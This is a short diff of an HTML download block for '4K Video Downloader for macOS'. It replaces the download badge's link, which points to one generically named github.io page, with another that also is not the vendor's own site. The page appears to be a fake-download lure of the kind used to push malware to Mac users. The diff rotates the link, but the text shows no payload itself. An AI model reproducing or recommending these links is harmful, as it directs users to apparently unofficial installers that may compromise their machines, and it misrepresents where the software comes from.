@@ -6,7 +6,7 @@
 <h3>4K Video Downloader for macOS</h3>
 <p>4K Video Downloader is a specialized media downloader for online video platforms designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/4k">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
